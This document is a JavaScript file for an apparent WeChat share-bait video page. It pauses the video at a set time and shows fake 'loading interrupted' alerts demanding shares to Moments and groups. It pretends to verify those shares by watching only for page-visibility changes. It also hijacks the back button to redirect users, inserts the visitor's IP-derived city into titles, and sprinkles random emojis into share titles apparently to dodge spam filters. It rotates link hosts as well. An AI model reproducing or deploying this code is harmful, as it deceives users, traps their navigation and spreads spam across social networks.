var video, player, playStatus = 'pending';
var isOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var elId = 'mod_player_skin_0';
var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
var elWidth = $("#js_content").width();
var alertTimes = 0;
var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : '';
var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
var shareATimes = 0;
var vcode = configData.code;
var til = (configData.title).replace('<city>', '');
var vid = vcode;
var delayTime = configData.stop_time;

var onVisibilityChange = function () {
    if (!document[hiddenProperty]) {
        if (delayTime < 9999) {
            switchStatus = true;
            shareATimes += 1;
            setTimeout(share_tip(shareATimes), 2000);
        }
    }
};

$('header').text(til);

function getDate() {
    var date = new Date();
    return date.getFullYear() + '-' + (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-' + date.getDate()
}
$('.time').text(getDate());

document.addEventListener(visibilityChangeEvent, onVisibilityChange);

if (localStorage.getItem('opened' + vcode) && !(/debug=1/.test(location.href)) && !sessionStorage.isDT && false) {
    location.href = 'https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=43&source=2&url=';
}
;

if (/debug=1/.test(window.location.href)) {
    localStorage.setItem(vid, '');
}
;


localStorage.setItem('opened' + vcode, true);

$("#js_content").first().attr('id', elId);

Array.prototype.contains = function (obj) {
    var i = this.length;
    while (i--) {
        if (this[i] === obj) {
            return true;
        }
    }
    return false;
};

function arrRandXNext(arr, n) {
    var ret = [];
    var retIdx = [];
    for (var i = 0; i < n; i++) {

        var num = Math.round(Math.random() * (arr.length - 1));

        if (retIdx.contains(num)) {
            i--;
        } else {
            retIdx.push(num);
        }
    }

    for (var k = 0; k < retIdx.length; k++) {
        ret.push(arr[retIdx[k]]);
    }

    return ret;
};

function hh() {
    history.pushState(history.length + 1, "app", '#ad_' + (new Date().getTime()));
};

function jp() {
    try {
        location.href = configData.back_url + '?r=' + (new Date().getTime());
    } catch (e) {
        console.log(e)
    }
};


function playVideo(vid, elId, elWidth) {
    //定义视频对象
    video = new tvp.VideoInfo();
    //向视频对象传入视频vid
    video.setVid(vid);
    //定义播放器对象
    player = new tvp.Player(elWidth, 200);
    //设置播放器初始化时加载的视频
    player.setCurVideo(video);
    //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
    if (sessionStorage.isAT && isOS) {
        document.addEventListener("WeixinJSBridgeReady", function () {
            player.play();
        }, false);
    }
    player.addParam("wmode", "transparent");
    player.addParam("pic", tvp.common.getVideoSnapMobile(vid));
    player.write(elId);
    player.onplaying = function () {
        if (!sessionStorage.pt) {
            sessionStorage.pt = new Date().getTime();
        }
    };
};

function wxalert(msg, btn, callback) {

    var d = $('#lly_dialog');
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);

    d.find("#lly_dialog_btn").off('click').on('click', function () {
        d.hide(200);
        if (callback) {
            callback()
        }
    })
};

function show_tip() {
    wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到<b style="color: red;">朋友圈</b>，可<b style="color: red;">免流量加速观看</b>', '好')
};

function jssdk() {
    if (!isOS) {
        if (!sessionStorage.isDT) {
            sessionStorage.isDT = 1;
            return location.reload();
        }
    }

    $("#fenxiang").show();
    show_tip();
};

function getUrlParam(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]);
    return null;
};


function share_tip(share_app_times) {

    var shareTitle = til;

    var emojis = $('#emojisPool').text().split(',');
    var ri = Math.floor(Math.random() * shareTitle.length);
    ri = (ri < 3 ? (ri + 3) : ri);
    var ei = Math.floor(Math.random() * emojis.length);

    var ri1 = 2;
    var ei1 = 2;
    var rc = 3;
    while (rc--) {
        ri1 = Math.floor(Math.random() * shareTitle.length);
        ri1 = (ri1 < 3 ? (ri1 + 3) : ri1);
        ei1 = Math.floor(Math.random() * emojis.length);
        if (ri1 != ri) {
            break;
        }
    }
    ;

    var title = [];
    for (var n in shareTitle) {
        title.push(shareTitle[n]);
        if (n == ri) {
            title.push(emojis[ei]);
        }
        if (n == ri1) {
            title.push(emojis[ei1]);
        }
    }
    ;
    document.title = title.join('');

    switch (share_app_times) {
        case 1:
            wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个群即可观看！', '好', function () {
                $('#fenxiang').attr('src', '/public/images/fenxiang-bk-2.png')
            });
            break;
        case 2:
            wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后一步!请分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看!', '好');
            break;
        case 3:
            wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>点击确定继续观看', '确定', function () {
                delayTime = 99999;
                $("#fenxiang").hide();
                sessionStorage.removeItem("pt");
                player.onplaying = function () {};
                player.play();
                localStorage.setItem(vid, 's');
                sessionStorage.removeItem("load");
            });
            break;
        default :
            break;
    }
};

function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
};

function ad_top_click(url) {
    jump(url);
};

function ad_bottom_click(url) {
    jump(url);
};

function chkwvs() {
    if (!sessionStorage.isAT && isOS && wechatInfo && wechatInfo[1] >= "6.5.1") {
        //setTimeout("document.getElementById('sa').style.display='block';", 900);
    }
};

function winrs() {
    if (isOS) {
        player.onplaying = function () {
            if (!sessionStorage.isAT) {
                sessionStorage.isAT = 1;
            }
        };
    }
};

function stopLoad() {
    try {
        if (!!(window.attachEvent && !window.opera)) {
            document.execCommand("stop");
        }
        else {
            window.stop();
        }
    } catch (e) {
    }
};


$("#pauseplay").height($("#js_content").height() - 10);

$('#pauseplay').on('click', function () {
    jssdk();
});

var start = 0;
var switchStatus = false;

$('#fenxiang').on('click', function () {
    if (switchStatus) {
        wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请继续分享到<b style="color: red;">【群】</b>', '好');
    } else {
        wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>注意要分享到<b style="color: red;">【朋友圈】</b>', '好');
    }
});

$('#like').on('click', function () {
    var $icon = $(this).find('i');
    var $num = $(this).find('#likeNum');
    var num = 0;
    if (!$icon.hasClass('praised')) {
        num = parseInt($num.html());
        if (isNaN(num)) {
            num = 0;
        }
        $num.html(++num);
        $icon.addClass("praised");
    } else {
        num = parseInt($num.html());
        num--;
        if (isNaN(num)) {
            num = 0;
        }
        $num.html(num);
        $icon.removeClass("praised");
    }
});

playVideo(vid, elId, elWidth);

var pars = {};

pars.url = location.href;

if (playStatus == 'pending') {
    var isFirst = true;
    setInterval(function () {
        try {
            var currentTime = player.getCurTime();
            if (currentTime >= delayTime && localStorage.getItem(vid) != 's') {
                $('#pauseplay').show();
                player.setPlaytime(delayTime - 1);
                player.pause();
                player.cancelFullScreen();
                sessionStorage.setItem(vid, 's');
                sessionStorage.setItem('load', false);
                if (isFirst) {
                    stopLoad();
                    sessionStorage.isDT = 1;
                    location.reload();
                    jssdk();
                }
                isFirst = false;
            }
        } catch (e) {

        }
    }, 1000);
}
;

setTimeout(function () {
    $('.container-bg').height(window.screen.height);
    var h = $('#scroll').height();
    $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
    new IScroll('.container', {useTransform: false, click: true});
}, 500);

if (sessionStorage.isDT) {
    jssdk();
    sessionStorage.removeItem("isDT");
}
;

window.onhashchange = function (e) {
    jp();
};

setTimeout('hh();', 100);

window.onload = function () {

    if (sessionStorage.isAT) {
        chkwvs = function () {
        };
        sessionStorage.removeItem("isAT");
    }
    setTimeout('hh();', 100);
};

winrs();

window.onresize = window.onorientationchange = function () {
    winrs();
};

var _hmt = _hmt || [];

(function () {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?fb8baffc069df974ed803c373de617aa";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();

var coordinate = {};

$.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js', function () {
    coordinate = remote_ip_info;
    til = remote_ip_info.city + til;
    $('header').text(til);

    for (var n = 0; n < configData.shareVideos.length; n++) {
        var li = $('<li style="list-style:none;line-height:1.5;margin-top:5px;"></li>');
        li.text(configData.shareVideos[n].title);
        $idx = Math.ceil(Math.random()*configData.hosts.length-1);
        var alink = $('<a href="' + configData.hosts[$idx].hosts + '?vid=' + configData.shareVideos[n].map_id + '"></a>');
        alink.append(li);
        $('#hutui').append(alink);
    }
    ;

    $("li").each(function () {
        $(this).text((Math.random() > 0.8 ? remote_ip_info.city : "") + $(this).text().trim('<city>').trim('</city>'))
    });

    //var emojis = ['1f4a2', '1f4a3', '1f4a4', '1f4a5', '1f4a6', '1f4aa', '1f4ab'];
    //var header = $('header').text();
    // var ri = Math.floor(Math.random() * header.length);
    // ri = (ri < 3 ? (ri + 3) : ri);
    // var ei = Math.floor(Math.random() * 7);
    // var title = [];
    // for (var n in header) {
    //     title.push(header[n]);
    //     if (n == ri) {
    //         title.push('<span class="emoji emoji' + emojis[ei] + '"></span>');
    //     }
    // }

   // $('header').html(title.join(''));

    //var shareTitle = til;

    // var emojis = $('#emojisPool').text().split(',');
    // var ri = Math.floor(Math.random() * shareTitle.length);
    // ri = (ri < 3 ? (ri + 3) : ri);
    // var ei = Math.floor(Math.random() * emojis.length);
    //
    // var ri1 = 2;
    // var ei1 = 2;
    // var rc = 3;
    // while (rc--) {
    //     ri1 = Math.floor(Math.random() * shareTitle.length);
    //     ri1 = (ri1 < 3 ? (ri1 + 3) : ri1);
    //     ei1 = Math.floor(Math.random() * emojis.length);
    //     if (ri1 != ri) {
    //         break;
    //     }
    // }

    // var title = [];
    // for (var n in shareTitle) {
    //     title.push(shareTitle[n]);
    //     if (n == ri) {
    //         title.push(emojis[ei]);
    //     }
    //     if (n == ri1) {
    //         title.push(emojis[ei1]);
    //     }
    // }

    document.title = til;

    $("li").each(function () {
        var text = $(this).text();
        var title = [];
        title.push('<span class="emoji emoji1f4a5"></span>');
        title.push(text);
        $(this).html(title.join(''));
    });
});
